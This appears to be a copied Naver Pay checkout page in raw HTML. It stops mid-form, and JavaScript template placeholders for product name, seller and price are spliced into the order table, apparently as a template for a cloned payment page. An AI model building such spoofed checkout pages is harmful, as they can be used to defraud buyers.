					#gnb.gnb_one_small .gnb_ico_num{top:5px;right:6px;width:24px}
					#gnb.gnb_one_flat .gnb_login_li,
					#gnb.gnb_one_flat .gnb_my_li,
					#gnb.gnb_one_flat .gnb_notice_li,
					#gnb.gnb_one_flat .mail_li,
					#gnb.gnb_one_flat .gnb_service_li {border-color: #e0e0e0;}
					#gnb.gnb_one_flat .gnb_notice_li.hover,
					#gnb.gnb_one_flat .mail_li.hover,
					#gnb.gnb_one_flat .gnb_service_li.hover {background-color: rgba(0, 0, 0, 0.04);}
					#gnb.gnb_one_flat .gnb_service_li .gnb_service .gnb_icon,
					#gnb.gnb_one_flat .gnb_service_li .gnb_service:hover .gnb_icon {background-image: url(http://ssl.pstatic.net/static/common/gnb/one/sp_gnb_4b16e6.png);background-position: -84px -24px;background-repeat: no-repeat; width: 16px;height: 16px;vertical-align: top; margin: 0 1px;}
					#gnb.gnb_one_flat .mail_li a.gnb_mail .gnb_icon,
					#gnb.gnb_one_flat .mail_li a.gnb_mail:hover .gnb_icon {background-image: url(http://ssl.pstatic.net/static/common/gnb/one/sp_gnb_4b16e6.png);background-position: 0px -42px;background-repeat: no-repeat;width: 20px;height: 16px;vertical-align: top;margin: 0 1px;}
					#gnb.gnb_one_flat .gnb_notice_li a.gnb_notice .gnb_icon,
					#gnb.gnb_one_flat .gnb_notice_li a.gnb_notice:hover .gnb_icon {background-image: url(http://ssl.pstatic.net/static/common/gnb/one/sp_gnb_4b16e6.png);background-position: -84px 0px;background-repeat: no-repeat;width: 16px;height: 18px;vertical-align: top;margin: 0 1px;}
					#gnb.gnb_one_flat .gnb_my_li .gnb_my .gnb_name,
					#gnb.gnb_one_flat .gnb_login_li .gnb_btn_login .gnb_txt {color: #666;}</style><script src="http://ssl.pstatic.net/static.gn/js/clickcrD.js" id="gnb_clickcrD" charset="utf-8"></script><script src="https://static.nid.naver.com/getLoginStatus?callback=showGNB&amp;charset=utf-8&amp;svc=checkout&amp;template=gnb_utf8&amp;one_naver=0" id="gnb_user_data" charset="utf-8"></script><script src="https://static.nid.naver.com/getLoginStatus?callback=showGNB&amp;charset=utf-8&amp;svc=checkout&amp;template=gnb_utf8&amp;one_naver=0" id="gnb_user_data" charset="utf-8"></script><script src="https://static.nid.naver.com/getLoginStatus?callback=showGNB&amp;charset=utf-8&amp;svc=checkout&amp;template=gnb_utf8&amp;one_naver=0" id="gnb_user_data" charset="utf-8"></script><script src="https://static.nid.naver.com/getLoginStatus?callback=showGNB&amp;charset=utf-8&amp;svc=checkout&amp;template=gnb_utf8&amp;one_naver=0" id="gnb_user_data" charset="utf-8"></script></head>
					<body class="w_bg1">
						<div id="wrap">
					
						<!-- u_skip -->
						
						<!-- //u_skip -->
					
						<!-- header -->
						<div id="header">
							<div class="hd_inner">
							<script type="text/javascript">
								var nsc="checkout.all";
								var gnb_service="checkout";
								var gnb_template="gnb_utf8";
								var gnb_logout=encodeURIComponent("http://pay.naver.com/about");
								var gnb_brightness=2;
								var gnb_item_hide_option=0;
							</script>
							<div class="gnb_sc">
								<div class="site">
									<dl>
									<dt class="blind">패밀리사이트</dt>
									<dd>
										<a href="http://www.naver.com/" class="s_link1"><span>NAVER</span></a><!--N=a:GNB.naver-->
										<a href="http://shopping.naver.com" class="s_link2"><span>네이버쇼핑</span></a><!--N=a:GNB.shopping-->
									</dd>
									</dl>
								</div>
								<div class="chkout_gnb_wrap">
									<dl class="link">
									<dt class="blind">네이버페이링크</dt>
									<dd>
										<a href="http://shopping.naver.com/cart">
											<span class="icon_cart"></span>장바구니
										</a><!--N=a:GNB.cart-->
									</dd>
									</dl>
									<!-- GNB -->
									<div id="gnb" class="gnb_dark"><strong class="blind">사용자 링크</strong><ul class="gnb_lst" id="gnb_lst" style="display:none"><li class="gnb_login_li" id="gnb_login_layer"><a class="gnb_btn_login" href="#" id="gnb_login_button"><span class="gnb_bg"></span><span class="gnb_bdr"></span><span class="gnb_txt">로그인</span></a></li><li class="gnb_my_li" id="gnb_my_layer" style="display:none"><div class="gnb_my_namebox" id="gnb_my_namebox"><a href="javascript:;" class="gnb_my" onclick="gnbUserLayer.clickToggle(); return false;"><img id="gnb_profile_img" src="data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs%3D" onerror="this.src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFAAAABQCAMAAAC5zwKfAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAADNQTFRF8PDw5ubm+vr6+/v76enp+Pj47e3t5+fn9/f37Ozs9PT08vLy7+/v6urq9fX15OTk/f39pqwodgAAAQNJREFUeNrs11EOgyAMgOEWUAF19f6n3cMeplJHoSZbsv4H+DIWaCNsNwcGGmiggQZ+D/Q5reuasr8H9ID0CsHfALpA74JTgwPSPnRK0Ac6FrwOXOjcogIdlTkNuDDgogGRAVEBDsQ19IMzC879ILAgGNgAZhbMP3RttonxJs1Lgea/sDYcyreHXjW+oPUHVid2MWC1K+A0sqsDW7CksGmlCNZoFt9pIfjYgY8bwMMexUENQuOtqYCxfHtT7AddYodDcp0gIPEh9IBxous+nBuaTis4Nw/OSLVwloN+JEmjGJR5FyIDRpIWZeAoBkcZGMRgkIEkz0D7GjXQQAMN/GvwKcAAEGGHJh0mmaAAAAAASUVORK5CYII='" width="26" height="26" alt="내 프로필 이미지"><span id="gnb_profile_filter_mask" class="filter_mask"></span> <span class="gnb_name" id="gnb_name1"></span><em class="blind">내정보 보기</em><span class="ico_arrow"></span></a><a href="#" class="gnb_emp" id="gnb_emp">(임직원혜택)</a></div><div class="gnb_my_lyr" id="gnb_my_lyr"><div class="gnb_my_content"><div class="gnb_img_area"><span class="gnb_mask"></span><img src="data:image/gif;base64,R0lGODlhAQABAAD/ACwAAAAAAQABAAACADs%3D" onerror="this.src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAFAAAABQCAMAAAC5zwKfAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAADNQTFRF8PDw5ubm+vr6+/v76enp+Pj47e3t5+fn9/f37Ozs9PT08vLy7+/v6urq9fX15OTk/f39pqwodgAAAQNJREFUeNrs11EOgyAMgOEWUAF19f6n3cMeplJHoSZbsv4H+DIWaCNsNwcGGmiggQZ+D/Q5reuasr8H9ID0CsHfALpA74JTgwPSPnRK0Ac6FrwOXOjcogIdlTkNuDDgogGRAVEBDsQ19IMzC879ILAgGNgAZhbMP3RttonxJs1Lgea/sDYcyreHXjW+oPUHVid2MWC1K+A0sqsDW7CksGmlCNZoFt9pIfjYgY8bwMMexUENQuOtqYCxfHtT7AddYodDcp0gIPEh9IBxous+nBuaTis4Nw/OSLVwloN+JEmjGJR5FyIDRpIWZeAoBkcZGMRgkIEkz0D7GjXQQAMN/GvwKcAAEGGHJh0mmaAAAAAASUVORK5CYII='" width="80" height="80" alt="프로필 이미지"><a href="https://nid.naver.com/user2/api/naverProfile?m=checkIdType" class="gnb_change"><span class="blind">프로필 사진 변경</span></a></div><div class="gnb_txt_area"><p class="gnb_account"><span class="gnb_name" id="gnb_name2"><a class="gnb_nick" href="https://nid.naver.com/user2/api/naverProfile?m=checkIdType">_</a>님</span><a class="gnb_btn_login" href="#" id="gnb_logout_button"><span class="gnb_bg"></span><span class="gnb_bdr"></span><span class="gnb_txt">로그아웃</span></a></p><a href="https://mail.naver.com" class="gnb_mail_address">@naver.com</a><ul class="gnb_edit_lst"><li class="gnb_info"><a href="https://nid.naver.com/user2/help/myInfo?menu=home">내정보</a></li><li class="gnb_secure" id="gnb_secure_lnk"><a href="https://nid.naver.com/user2/help/myInfo?m=viewSecurity&amp;menu=security">보안설정</a></li><li class="gnb_cert" id="gnb_cert_lnk"><a href="https://nid.naver.com/user2/eSign/v1/home/land">내인증서</a></li></ul><div class="gnb_pay_check" id="gnb_pay_check"><p class="gnb_membership" style="display: none;" id="gnb_membership"><a href="https://nid.naver.com/membership/my" class="gnb_my_membership"><i class="blind">네이버 멤버쉽</i></a></p><em>N Pay</em><a href="https://pay.naver.com" id="gnb_pay_point"><span style="display: none">내 페이포인트</span></a></div></div></div><div class="gnb_my_community"><a href="https://blog.naver.com/MyBlog.naver" class="gnb_blog">내 블로그</a><a href="https://section.cafe.naver.com" class="gnb_cafe">가입한 카페</a><a href="https://pay.naver.com" class="gnb_pay"><span>N Pay</span></a></div><a href="#" class="gnb_my_interface" style="display:none"><span class="blind">환경설정</span></a></div><iframe id="gnb_my_lyr_iframe" title="빈 프레임" class="gnb_pad_lyr" name="padding" width="0" height="0" scrolling="no" frameborder="0" style="top:34px;right:-4px;width:320px;height:158px;display:none;opacity:0;-ms-filter:alpha(opacity=0)"></iframe></li><li class="gnb_notice_li" id="gnb_notice_layer" style="display:none"><a href="javascript:;" class="gnb_notice" onclick="gnbNaverMeLayer.clickToggle(); return false;"><span class="blind">알림</span><span class="gnb_icon"></span><em class="gnb_ico_num" id="gnb_me_menu" style="display:none"><span class="gnb_ico_new"><span class="gnb_count" id="gnb_me_count"></span></span></em><span class="ico_arrow"></span></a><div class="gnb_notice_lyr" id="gnb_notice_lyr"><div class="svc_noti svc_panel"><div class="svc_scroll"><div class="svc_head"><strong class="gnb_tit">전체 알림</strong><div class="task_right"><button onclick="gnbNaverMeLayer.deleteReadList(this, event);" id="gnb_btn_read_noti_del">읽은 알림 삭제</button><button onclick="gnbNaverMeLayer.showDeleteAlert();" id="gnb_btn_all_noti_del">모두 삭제</button></div></div><div class="svc_body" id="gnb_naverme_layer"></div></div><div class="gnb_ly_alert" id="gnb_ly_alert" style="display: none;"><p class="gnb_msg"><strong>알림을 모두 삭제하시겠습니까?</strong></p><div class="gnb_btns"><button id="ly_alert_confirm" onclick="gnbNaverMeLayer.deleteAllList(this, event);">확인</button><button onclick="gnbNaverMeLayer.hideDeleteAlert();">취소</button></div><button class="gnb_btn_close" onclick="gnbNaverMeLayer.hideDeleteAlert();"><i>레이어 닫기</i></button></div><a href="https://noti.naver.com/index.nhn" class="gnb_notice_all">내 알림 전체보기</a></div></div><iframe id="gnb_notice_lyr_iframe" title="빈 프레임" class="gnb_pad_lyr" name="padding" width="0" height="0" scrolling="no" frameborder="0" style="top:34px;right:-4px;width:299px;height:332px;display:none;opacity:0;-ms-filter:alpha(opacity=0)"></iframe></li><li class="mail_li" id="gnb_mail_layer" style="display:none"><a href="https://mail.naver.com" class="gnb_mail"><span class="blind">메일</span><span class="gnb_icon"></span><em class="gnb_ico_num" id="gnb_mail_menu" style="display:none"><span class="gnb_ico_new"><span class="gnb_count" id="gnb_mail_count"></span></span></em></a></li><li class="gnb_service_li" id="gnb_service_layer"><a href="javascript:;" class="gnb_service" onclick="gnbMoreLayer.clickToggle(); return false;"><span class="blind">서비스 더보기</span><span class="gnb_icon"></span><span class="ico_arrow"></span></a><div class="gnb_service_lyr" id="gnb_service_lyr"><div class="gnb_favorite_search" id="gnb_favorite_search"><div class="gnb_favorite_area"><div class="gnb_favorite_lstwrp"><div class="gnb_first_visit" style="display:none"><span class="blind">나만의 즐겨찾기를 추가해 보세요!</span><a href="#" class="gnb_close"><span class="blind">닫기</span></a></div><strong class="blind">즐겨찾는 서비스</strong><ul class="gnb_favorite_lst" id="gnb_favorite_lst"><li class="gnb_add"><a href="#"><span class="ic_add"></span>추가</a></li><li class="gnb_add"><a href="#"><span class="ic_add"></span>추가</a></li><li class="gnb_add"><a href="#"><span class="ic_add"></span>추가</a></li><li class="gnb_add"><a href="#"><span class="ic_add"></span>추가</a></li></ul><a href="#" class="gnb_my_interface" onclick="gnbMoreLayer.clickToggleWhole(); return false;"><span class="blind">즐겨찾기 설정</span></a></div></div><div class="gnb_search_area"><div class="gnb_search_box" onmouseover="gnb_search.mouseOver(this);" onmouseout="gnb_search.mouseOut(this);"><input id="gnb_svc_search_input" type="text" title="서비스 검색" value="더 많은 서비스를 간편하게 시작하세요!" onfocus="gnb_search.clearInput(this);" onblur="gnb_search.resetInput(this);" onkeydown="gnb_search.keyDown(event);" onkeyup="gnb_search.keyUp(event);"><a href="#" class="gnb_del_txt" id="gnb_del_txt" style="display:none"><span class="blind">삭제</span></a><div class="gnb_pop_input" id="gnb_pop_input" tabindex="0" onfocus="gnb_search.searchPopOnMouse = true; return false;" onfocusout="gnb_search.searchPopOnMouse = false; return false;" onmouseover="gnb_search.searchPopOnMouse = true; return false;" onmouseout="gnb_search.searchPopOnMouse = false; return false;" style="display:none"><ul class="gnb_pop_lst"></ul></div></div><div id="gnb_search_lstwrp" class="gnb_search_lstwrp"><ul class="gnb_search_lst gnb_first"><li class="gnb_first"><a id="gnb_search_lst_first_item" href="https://cafe.naver.com/">카페</a></li><li><a href="https://news.naver.com/">뉴스</a></li><li><a href="https://map.naver.com/">지도</a></li><li><a href="https://sports.news.naver.com/">스포츠</a></li><li><a href="https://game.naver.com/">게임</a></li></ul><ul class="gnb_search_lst"><li class="gnb_first"><a href="https://section.blog.naver.com/">블로그</a></li><li><a href="https://post.naver.com/main.nhn">포스트</a></li><li><a href="https://dict.naver.com/">사전</a></li><li><a href="https://kin.naver.com/">지식iN</a></li><li><a href="https://n.weather.naver.com/">날씨</a></li></ul><ul class="gnb_search_lst"><li class="gnb_first"><a href="https://mail.naver.com/">메일</a></li><li><a href="https://stock.naver.com/">증권</a></li><li><a href="https://land.naver.com/">부동산</a></li><li><a href="https://vibe.naver.com/today/">VIBE</a></li><li><a href="https://book.naver.com">책</a></li></ul><ul class="gnb_search_lst"><li class="gnb_first"><a href="https://shopping.naver.com/">쇼핑</a></li><li><a href="https://comic.naver.com/">웹툰</a></li><li><a href="https://movie.naver.com/">영화</a></li><li><a href="https://mybox.naver.com/">MYBOX</a></li><li><a href="https://auto.naver.com/">자동차</a></li></ul></div></div><div class="gnb_banner"><a href="https://campaign.naver.com/npay/rediret/index.nhn" class="gnb_service_event"><img id="gnb_promo" alt="N페이, 이벤트 참여하면 포인트 적립!" width="265" height="47" src="https://ssl.pstatic.net/static/common/gnb/banner/promo_npay_200108.png"></a></div><div class="gnb_linkwrp"><a href="https://www.naver.com/more.html" class="gnb_service_all" id="gnb_service_all">전체 서비스 보기</a></div></div><div class="gnb_svc_more" id="gnb_svc_more" style=""><strong class="blind">네이버 주요 서비스</strong><div class="gnb_bg_top"></div><div class="gnb_svc_hd" id="gnb_svc_hd" tabindex="0"><strong class="gnb_svc_tit">바로가기 설정</strong><span class="link"><a href="https://www.naver.com/more.html">전체 서비스 보기</a></span></div><div class="gnb_svc_lstwrp"><div class="gnb_svc_lst1"><ul class="gnb_first"><li><input type="checkbox" id="nsvc_game" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_game">게임</label></li><li><input type="checkbox" id="nsvc_weather" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_weather">날씨</label></li><li><input type="checkbox" id="nsvc_shopping" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_shopping">네이버쇼핑</label></li><li><input type="checkbox" id="nsvc_navercast" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_navercast">네이버캐스트</label></li><li class="gnb_event"><input type="checkbox" id="nsvc_naverpay" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_naverpay">네이버페이<em class="ic_gnb_new">New</em></label></li><li><input type="checkbox" id="nsvc_mybox" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_mybox">네이버 MYBOX</label></li><li><input type="checkbox" id="nsvc_news" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_news">뉴스</label></li><li><input type="checkbox" id="nsvc_comic" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_comic">웹툰</label></li><li><input type="checkbox" id="nsvc_memo" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_memo">메모</label></li><li><input type="checkbox" id="nsvc_mail" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_mail">메일</label></li><li><input type="checkbox" id="nsvc_music" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_music">뮤직</label></li><li><input type="checkbox" id="nsvc_land" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_land">부동산</label></li><li><input type="checkbox" id="nsvc_bookmark" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_bookmark">북마크</label></li></ul><ul class=""><li><input type="checkbox" id="nsvc_blog" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_blog">블로그</label></li><li><input type="checkbox" id="nsvc_dic" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_dic">사전</label></li><li><input type="checkbox" id="nsvc_software" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_software">소프트웨어</label></li><li><input type="checkbox" id="nsvc_smartboard" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_smartboard">스마트보드</label></li><li><input type="checkbox" id="nsvc_sports" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_sports">스포츠</label></li><li><input type="checkbox" id="nsvc_series" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_series">시리즈</label></li><li><input type="checkbox" id="nsvc_serieson" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_serieson">시리즈on</label></li><li><input type="checkbox" id="nsvc_ya9" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_ya9">야구9단</label></li><li><input type="checkbox" id="nsvc_movie" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_movie">영화</label></li><li><input type="checkbox" id="nsvc_office" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_office">오피스</label></li><li><input type="checkbox" id="nsvc_novel" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_novel">웹소설</label></li><li><input type="checkbox" id="nsvc_auto" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_auto">자동차</label></li><li><input type="checkbox" id="nsvc_contact" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_contact">주소록</label></li></ul><ul class=""><li><input type="checkbox" id="nsvc_finance" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_finance">증권(금융)</label></li><li><input type="checkbox" id="nsvc_map" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_map">지도</label></li><li><input type="checkbox" id="nsvc_kin" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_kin">지식iN</label></li><li><input type="checkbox" id="nsvc_terms" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_terms">지식백과</label></li><li><input type="checkbox" id="nsvc_book" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_book">책</label></li><li><input type="checkbox" id="nsvc_cafe" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_cafe">카페</label></li><li><input type="checkbox" id="nsvc_calendar" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_calendar">캘린더</label></li><li><input type="checkbox" id="nsvc_navertv" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_navertv">네이버TV</label></li></ul></div><div class="svc_lst2"><div class="svc_spc gnb_first"><strong><a href="https://dict.naver.com/">어학사전</a></strong><ul class=""><li><input type="checkbox" id="nsvc_krdic" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_krdic">국어사전</label></li><li><input type="checkbox" id="nsvc_endic" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_endic">영어/영영사전</label></li><li><input type="checkbox" id="nsvc_hanja" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_hanja">한자사전</label></li><li><input type="checkbox" id="nsvc_jpdic" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_jpdic">일어사전</label></li><li><input type="checkbox" id="nsvc_cndic" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_cndic">중국어사전</label></li><li><input type="checkbox" id="nsvc_frdic" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_frdic">프랑스어사전</label></li><li><input type="checkbox" id="nsvc_dedic" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_dedic">독일어사전</label></li><li><input type="checkbox" id="nsvc_rudic" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_rudic">러시아어사전</label></li><li><input type="checkbox" id="nsvc_vndic" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_vndic">베트남어사전</label></li><li><input type="checkbox" id="nsvc_spdic" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_spdic">스페인어사전</label></li><li><input type="checkbox" id="nsvc_papago" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_papago">파파고</label></li></ul></div><div class="svc_spc"><strong>인기/신규서비스</strong><ul class=""><li><input type="checkbox" id="nsvc_grafolio" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_grafolio">그라폴리오</label></li><li><input type="checkbox" id="nsvc_post" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_post">포스트</label></li><li><input type="checkbox" id="nsvc_band" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_band">밴드</label></li><li><input type="checkbox" id="nsvc_line" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_line">라인</label></li><li class="gnb_event"><input type="checkbox" id="nsvc_vibe" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_vibe">VIBE<em class="ic_gnb_new">New</em></label></li><li><input type="checkbox" id="nsvc_pcontents" name="selmenu" class="gnb_input_check" value=""> <label for="nsvc_pcontents">프리미엄콘텐츠</label></li></ul></div></div></div><div class="svc_btnwrp"><div class="svc_btns"><button class="gnb_save" onclick="if(gnbFavorite.addService()){gnbMoreLayer.clickToggleWhole()} return false;"><strong class="blind">확인</strong></button><button class="gnb_close" onclick="gnbFavorite.cancel(); return false;"><span class="blind">취소</span></button><button class="gnb_return" onclick="gnbFavorite.resetService(); return false;"><span class="blind">초기 설정으로 변경</span></button></div></div><div class="gnb_bg_btm"></div></div></div><iframe id="gnb_service_lyr_iframe" title="빈 프레임" class="gnb_pad_lyr" name="padding" width="0" height="0" scrolling="no" frameborder="0" style="display:none;top:34px;right:297px;width:585px;height:385px;opacity:0;-ms-filter:alpha(opacity=0)"></iframe><iframe id="gnb_svc_more_iframe" title="빈 프레임" class="gnb_pad_lyr" name="padding" width="0" height="0" scrolling="no" frameborder="0" style="display:none;top:34px;right:-4px;width:295px;height:385px;opacity:0;-ms-filter:alpha(opacity=0)"></iframe></li></ul></div>
									<script type="text/javascript" charset="utf-8" src="http://static.nid.naver.com/template/gnb_utf8.nhn?2022031303"></script>
									<!-- //GNB -->
								</div>
							</div>
					<!--    소개     -->
					<!--  마이페이지 -->
					
					<!--  결제내역  -->
					<!--  포인트  -->
					<!--  송금    -->
					<!--  선물함    -->
					<!--  판매·정산  -->
					<!-- 이벤트·쿠폰 -->
					<!-- 문의·리뷰 -->
					
					
							<div class="lnb_sc">
								<h1 class="sta">
									<a href="http://pay.naver.com" class="logo_naver"><span>N</span></a><!--N=a:LNB.pay-->
									<a href="http://pay.naver.com" class="logo_chkout"><span>Pay</span></a><!--N=a:LNB.pay-->
								</h1>
								<div class="lnb">
									<ul>
									<li><a href="http://order.pay.naver.com/home" class="menu1"><span>결제내역</span></a><!--N=a:LNB.order--></li>
									<li><a href="http://order.pay.naver.com/home?tabMenu=POINT_TOTAL" class="menu2"><span>포인트</span></a><!--N=a:LNB.point--></li>
									<li><a href="http://pay.naver.com/send/p/list/s" class="menu3"><span>송금</span></a><!--N=a:LNB.send--></li>
									<li><a href="http://pay.naver.com/mygift/d" class="menu8"><span>선물함</span></a><!--N=a:LNB.gift--></li>
									<li><a href="http://event2.pay.naver.com/event/benefit/list" class="menu5"><span>이벤트·쿠폰</span></a><!--N=a:LNB.event--></li>
									<li><a href="http://pay.naver.com/shoppingInquiry/inquiryList" class="menu6"><span>문의·리뷰</span></a><!--N=a:LNB
									.review--></li>
									</ul>
								</div>
							</div>		
						
							</div>
						</div> 
						<!-- //header -->
					
						<!-- container -->
						<div id="container">
							<!-- content -->
							<div id="order" class="order_sc _root _cartDiv">
					
					
					<!-- pg사별 Script -->
								
								
								
								
								
								
								
					<!-- 결제관련 공통 Script -->
						
					
					
					
					
					
					
					
					
																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																				   
					
					
					
					
					
					
					
					
					
					<div class="order_header">
						<h3 class="order_payment"><span class="blind">주문/결제</span></h3>
						<ol class="process">
							<li><em class="pro"><span class="blind">장바구니</span></em></li>
							<li class="on"><em class="pro2"><span class="blind">주문/결제</span></em></li>
							<li><em class="pro3"><span class="blind">주문완료</span></em></li>
						</ol>
					</div>
					
					
					
					<form id="orderForm" name="orderForm" class="_orderForm" method="post">
						<input type="hidden" name="tempOrderId" value="">
						<input type="hidden" name="donAgree" value="false" class="_donAgree _certificationForm">
						<input type="hidden" name="billingPgId" class="_payForm">
						<input type="hidden" name="reserveSeq" value="6261708841" class="_payForm">
						<input type="hidden" name="fdsUuid" value="" class="_fdsUuid _certificationForm">
						<input type="hidden" name="naverToken" value="" class="_naverToken _certificationForm">
						<input type="hidden" name="isNaverPayPasswordAvailable" value="false" class="_certificationForm">
						<input type="hidden" name="authentificationToken" value="" class="_authentificationToken _certificationForm">
						<input type="hidden" name="mbrsSscYn" value="false" class="_certificationForm">
					
						<div class="order_content">
					<div class="product_area">
						<span class="top_line"></span>
						<table cellspacing="0" class="tb_products">
							<caption>주문내역</caption>
							<colgroup>
								<col width="500">
								<col width="135">
								<col width="120">
								<col width="90">
								<col width="110">
								<col>
							</colgroup>
							<thead class="point_plus">
							<tr>
							<th scope="col" class="product">상품정보</th>
							<th scope="col">판매자</th>
							<th scope="col">배송비</th>
							<th scope="col">수량</th>
							<th scope="col" class="bg_point">할인</th>
							<th scope="col" class="col_price">상품금액(할인포함)</th>
							</tr>
							</thead>
							<tbody>
							
					
					
					
							<tr>
							<td>
							<span class="bdr"></span>
						<div class="product_info">
							<a href="http://smartstore.naver.com/main/products/2515203719" class="product_thmb" target="_blank">
								<span class="mask"></span><img src="`+물건이미지+`" alt="RGB to HDMI 젠더 변환 VGA to HDM 컨버터 모니터 잭" width="92" height="92">
							</a><!--N=a:ord.product-->
							<div class="product_dsc">
								<div class="additional_status">
										<span class="ico_npmember type_npay small"><span class="blind">네이버플러스 멤버십</span></span>
											<span class="predict_status p_color_green">내일 도착 확률 93%</span>
								</div>
										<strong class="name_seller">`+판매자이름+`</strong>
								<a href="" target="_blank" class="product_name">
									<strong>
										`+
										물건이름 +
										`
									</strong>
								</a><!--N=a:ord.product-->
		
									<div class="option">
										<span class="ico_option"><span class="blind">옵션</span></span>
										<ul class="option_list">
												<li>
													선택: `+물건이름+`/1개 
												</li>
										</ul>
									</div>
							</div>
							<span class="vm"></span>
						</div>
					</td>
					
									<td rowspan="1">
												<a href="http://smartstore.naver.com/withit" class="seller" target="_blank" title="위드잇">위드잇</a><!--N=a:ord.ord.sellerstore-->
									</td>
									<td rowspan="1">
					
												<span class="deli_fee"><span class="sp_order ico_deli"></span><span class="sum _deliveryPrice2022031490319617">2500원<a href="#" class="sp_order ico_que _deliveryFeeLayerBtn2022031490319617 _click(nmp.front.order.order_sheet.showLayerDeliveryFee(2022031423515848)) _stopDefault" style="display:none;"></a><!--N=a:ord.deldetail--></span><span class="_deliveryPriceText2022031490319617"></span></span>
												<span class="sp_ico_text today"><span class="blind">오늘출발</span></span>
												<span>오늘<br>12:00까지<br>결제하면<br>오늘 바로 발송</span>
									</td>
					
								<td>1개</td>
								<td>
								<span class="discount">
									<span class="_discountAmount2022031423515848">(-) </span>
									<span class="_discountAmountText2022031423515848">
										`+String(기존가격1 - 가격1)+`원</span>
									<a href="#" class="sp_order ico_que _discountAmountLayer2022031423515848
									_click(nmp.front.order.order_sheet.showLayerDiscount(2022031423515848)) _stopDefault">
										<span class="blind _discountAmountLayer2022031423515848">할인금액 도움말</span>
									</a><!--N=a:ord.discdetail-->
								</span>
						</td>
						<td class="col_price">
							<span class="orgn_price _productOrderTotalAmt2022031423515848"><em>`+기존가격+`</em>원</span>
							<strong><em class="_productOrderPayAmt2022031423515848">`+가격+`</em>원</strong>
						</td>
					</tr>
					
					
							</tbody>
						</table>
					</div>        <div class="cutting_line">
								<span class="ico_scissors"></span>
								<span class="shdw_left"></span>
								<span class="shdw_right"></span>
							</div>
					<input type="hidden" name="prestigeKey" value="" class="_certificationForm">
					
					
					
					
					<div class="payment_wrap">
						<div id="0" class="0">
							
							
					<div class="agree_wrap">
							<div style="display: none;">
								<div class="sp_order agree_sub _productAgreement" style="display: block;">
									<div class="s_checkbox">
												<span class="checkbox checkbox-applied _click(nmp.front.order.order_sheet.checkAllAgreed())" id="buyAgree">
													<span class="checkbox-mark checkbox-checked"></span>
													<input type="checkbox" name="payAgreement" id="buy_agree2" class="_certificationForm _agreeBtn" checked="">
												</span>
										<label for="buy_agree2">위 상품의 구매조건 확인 및 결제진행 동의</label>
									</div>
								</div>
							</div>
							<div class="agree_required" style="display: none;">
								<span class="checkbox checkbox-applied _click(nmp.front.order.order_sheet.onToggleAllAgree())" id="allAgree">
									<span class="checkbox-mark checkbox-checked"></span>
									<input type="checkbox" id="all_agree" name="allAgree" class="_certificationForm _allAgreeBtn">
								</span>
								<strong class="sp_order ico_agree_required"><label for="all_agree">전체 동의하기<span class="blind">(필수)</span></label></strong>
							</div>
							<div class="agree_section">
								<div class="agreement">
										개인정보 제공 동의 :
									<em class="store">
											위드잇
									</em>
										<div class="area_detail"><button type="button" class="button_detail _click(nmp.front.order.order_sheet.showLayerCommon(commonOrderAgreeLayer,false,false,left)) _stopDefault">상세보기</button></div>
								</div>
								<div class="agreement" style="display:none;">
									쇼핑몰 구매약관 동의
									<div class="area_detail">
										<button type="button" class="button_detail _click(nmp.front.order.order_sheet.openMallProvision(true)) _stopDefault">상세보기</button>
									</div>
									<div class="sp_order agree_sub" style="display: none;">
										<div class="s_checkbox">
